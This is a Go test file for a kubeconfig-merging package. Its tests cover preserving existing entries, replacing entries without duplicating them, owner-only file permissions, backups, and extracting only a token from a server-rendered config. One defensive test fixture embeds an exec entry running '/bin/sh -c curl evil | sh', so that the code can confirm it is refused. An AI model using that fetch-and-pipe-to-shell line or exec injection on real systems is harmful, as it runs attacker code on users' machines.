package kubeconfig

import (
	"os"
	"path/filepath"
	"strings"
	"testing"

	"go.yaml.in/yaml/v3"
)

// A kubeconfig somebody has lived with: comments, another tool's entries, an
// extension field nobody here knows about.
const lived = `# my clusters — do not lose this
apiVersion: v1
kind: Config
clusters:
  # the old one
  - name: minikube
    cluster:
      server: https://192.168.49.2:8443
      extensions:
        - name: cluster_info
          extension: {provider: minikube.sigs.k8s.io}
users:
  - name: minikube
    user:
      client-certificate: /home/me/.minikube/profiles/minikube/client.crt
contexts:
  - name: minikube
    context: {cluster: minikube, user: minikube}
current-context: minikube
preferences: {}
`

func write(t *testing.T, content string) string {
	t.Helper()
	path := filepath.Join(t.TempDir(), "config")
	if content != "" {
		if err := os.WriteFile(path, []byte(content), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	return path
}

func addKubemg(t *testing.T, path, server string) {
	t.Helper()
	file, err := Load(path)
	if err != nil {
		t.Fatal(err)
	}
	file.SetCluster("edge-us", server, "Q0E=")
	file.SetExecUser("dana@edge-us", Exec{Command: "kubemg", Args: []string{"credential", "--server", "https://kubemg.example.com", "--cluster-id", "7"}})
	file.SetContext("dana@edge-us", "edge-us", "dana@edge-us", "payments")
	file.SetCurrentContext("dana@edge-us")
	if err := file.Save(); err != nil {
		t.Fatal(err)
	}
}

type config struct {
	Clusters []struct {
		Name    string         `yaml:"name"`
		Cluster map[string]any `yaml:"cluster"`
	} `yaml:"clusters"`
	Users []struct {
		Name string         `yaml:"name"`
		User map[string]any `yaml:"user"`
	} `yaml:"users"`
	Contexts []struct {
		Name    string            `yaml:"name"`
		Context map[string]string `yaml:"context"`
	} `yaml:"contexts"`
	CurrentContext string `yaml:"current-context"`
}

func read(t *testing.T, path string) (config, string) {
	t.Helper()
	data, err := os.ReadFile(path)
	if err != nil {
		t.Fatal(err)
	}
	var out config
	if err := yaml.Unmarshal(data, &out); err != nil {
		t.Fatalf("written file does not parse: %v\n%s", err, data)
	}
	return out, string(data)
}

func TestMergingKeepsEverythingElse(t *testing.T) {
	path := write(t, lived)
	addKubemg(t, path, "https://kubemg.example.com/api/v1/clusters/7/proxy")

	got, raw := read(t, path)
	for _, want := range []string{"# my clusters — do not lose this", "# the old one", "cluster_info", "client-certificate"} {
		if !strings.Contains(raw, want) {
			t.Errorf("lost %q:\n%s", want, raw)
		}
	}
	if len(got.Clusters) != 2 || len(got.Users) != 2 || len(got.Contexts) != 2 {
		t.Fatalf("entries: %+v", got)
	}
	if got.CurrentContext != "dana@edge-us" {
		t.Fatalf("current-context %q", got.CurrentContext)
	}
	user := got.Users[1].User["exec"].(map[string]any)
	if user["apiVersion"] != ExecAPIVersion || user["command"] != "kubemg" || user["interactiveMode"] != "Never" {
		t.Fatalf("exec entry: %+v", user)
	}
	if got.Contexts[1].Context["namespace"] != "payments" {
		t.Fatalf("context: %+v", got.Contexts[1])
	}
}

func TestMergingTwiceReplacesRatherThanDuplicates(t *testing.T) {
	path := write(t, lived)
	addKubemg(t, path, "https://old.example.com/api/v1/clusters/7/proxy")
	addKubemg(t, path, "https://kubemg.example.com/api/v1/clusters/7/proxy")

	got, raw := read(t, path)
	if len(got.Clusters) != 2 || len(got.Users) != 2 || len(got.Contexts) != 2 {
		t.Fatalf("a second run duplicated entries:\n%s", raw)
	}
	if got.Clusters[1].Cluster["server"] != "https://kubemg.example.com/api/v1/clusters/7/proxy" {
		t.Fatalf("not replaced: %+v", got.Clusters[1])
	}
}

func TestAMissingFileIsStartedAndAnEmptyListIsFilled(t *testing.T) {
	missing := filepath.Join(t.TempDir(), "nested", "config")
	addKubemg(t, missing, "https://kubemg.example.com/p")
	got, raw := read(t, missing)
	if len(got.Contexts) != 1 || !strings.Contains(raw, "kind: Config") {
		t.Fatalf("new file:\n%s", raw)
	}

	// kubectl writes an empty list as null.
	nulls := write(t, "apiVersion: v1\nkind: Config\nclusters: null\nusers: null\ncontexts: null\ncurrent-context: \"\"\n")
	addKubemg(t, nulls, "https://kubemg.example.com/p")
	if got, raw := read(t, nulls); len(got.Clusters) != 1 || len(got.Users) != 1 {
		t.Fatalf("null lists:\n%s", raw)
	}
}

func TestTheFileIsOwnerOnlyAndTheOldOneKept(t *testing.T) {
	path := write(t, lived)
	addKubemg(t, path, "https://kubemg.example.com/p")
	info, err := os.Stat(path)
	if err != nil {
		t.Fatal(err)
	}
	if info.Mode().Perm() != 0o600 {
		t.Fatalf("mode %v", info.Mode().Perm())
	}
	backup, err := os.ReadFile(path + ".bak")
	if err != nil || string(backup) != lived {
		t.Fatalf("backup: %v\n%s", err, backup)
	}
}

func TestANotKubeconfigIsRefusedNotOverwritten(t *testing.T) {
	path := write(t, "- just\n- a list\n")
	if _, err := Load(path); err == nil {
		t.Fatal("a non-mapping file was loaded")
	}
}

// Only a token is taken from what the server rendered. A user entry carrying
// an exec command or an auth provider would run a program on this machine the
// next time kubectl used the context, so it is refused, not merged.
func TestTokenFromTakesATokenAndNothingElse(t *testing.T) {
	token, err := TokenFrom([]byte("apiVersion: v1\nkind: Config\nusers:\n- name: dana@edge-us\n  user: {token: abc}\n"))
	if err != nil || token != "abc" {
		t.Fatalf("token %q %v", token, err)
	}
	for name, rendered := range map[string]string{
		"exec":          "users:\n- name: x\n  user:\n    exec: {command: /bin/sh, args: [-c, 'curl evil | sh']}\n",
		"token and exec": "users:\n- name: x\n  user:\n    token: abc\n    exec: {command: /bin/sh}\n",
		"auth-provider": "users:\n- name: x\n  user:\n    auth-provider: {name: oidc}\n",
		"two users":     "users:\n- name: a\n  user: {token: a}\n- name: b\n  user: {token: b}\n",
		"no token":      "users:\n- name: a\n  user: {}\n",
	} {
		if _, err := TokenFrom([]byte(rendered)); err == nil {
			t.Errorf("%s was accepted", name)
		}
	}
}

func TestATokenUserIsWrittenAsOne(t *testing.T) {
	path := write(t, lived)
	file, _ := Load(path)
	file.SetTokenUser("dana@edge-us", "abc")
	if err := file.Save(); err != nil {
		t.Fatal(err)
	}
	got, _ := read(t, path)
	if len(got.Users) != 2 || got.Users[1].User["token"] != "abc" || got.Users[1].User["exec"] != nil {
		t.Fatalf("users: %+v", got.Users)
	}
}

func TestTargetPathFollowsKubectl(t *testing.T) {
	t.Setenv("KUBECONFIG", strings.Join([]string{"/tmp/first", "/tmp/second"}, string(os.PathListSeparator)))
	if got, _ := TargetPath(""); got != "/tmp/first" {
		t.Fatalf("got %s", got)
	}
	if got, _ := TargetPath("/explicit"); got != "/explicit" {
		t.Fatalf("got %s", got)
	}
	t.Setenv("KUBECONFIG", "")
	home, _ := os.UserHomeDir()
	if got, _ := TargetPath(""); got != filepath.Join(home, ".kube", "config") {
		t.Fatalf("got %s", got)
	}
}
